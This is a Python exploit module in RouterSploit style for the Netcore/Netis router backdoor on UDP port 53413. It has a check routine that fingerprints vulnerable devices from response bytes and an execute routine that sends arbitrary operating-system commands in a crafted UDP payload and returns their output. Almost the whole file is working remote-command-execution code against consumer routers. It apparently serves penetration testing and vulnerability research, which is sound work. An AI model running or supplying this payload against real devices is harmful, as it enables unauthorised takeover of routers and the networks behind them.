# rsf exploit module
# description: Exploits Netcore/Netis backdoor functionality that allows executing commands on the operating system level.

import socket

class Exploit:
    __info__ = {
        "name": "Netcore/Netis UDP 53413 RCE",
        "description": "Exploits Netcore/Netis backdoor functionality that allows executing commands on the operating system level.",
        "authors": (
            "Tim Yeh, Trend Micro",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://www.seebug.org/vuldb/ssvid-90227",
            "http://blog.trendmicro.com/trendlabs-security-intelligence/netis-routers-leave-wide-open-backdoor/",
        ),
        "devices": (
            "Netcore Router",
            "Netis Router",
        ),
    }

    def __init__(self, target_ip, port=53413):
        self.target_ip = target_ip
        self.port = port

    def run(self):
        if self.check():
            print("Target is vulnerable")
            print("Invoking command loop...")
        else:
            print("Target is not vulnerable")

    def execute(self, cmd):
        cmd = bytes(cmd, "utf-8")
        payload = b"AA\x00\x00AAAA" + cmd + b"\x00"
        udp_client = self.create_udp_client()
        udp_client.send(payload)
        response = udp_client.recv(1024)
        udp_client.close()

        if response:
            return str(response[8:], "utf-8")
        return ""

    def check(self):
        response = b""
        payload = b"\x00" * 8
        udp_client = self.create_udp_client()
        udp_client.send(payload)
        if udp_client:
            response = udp_client.recv(1024)

            if response:
                if response.endswith(b"\xD0\xA5Login:"):
                    return True  # target is vulnerable
                elif response.endswith(b"\x00\x00\x00\x05\x00\x01\x00\x00\x00\x00\x01\x00\x00"):
                    return True  # target is vulnerable

        return False  # target is not vulnerable

    def create_udp_client(self):
        udp_client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        udp_client.settimeout(5)
        udp_client.connect((self.target_ip, self.port))
        return udp_client

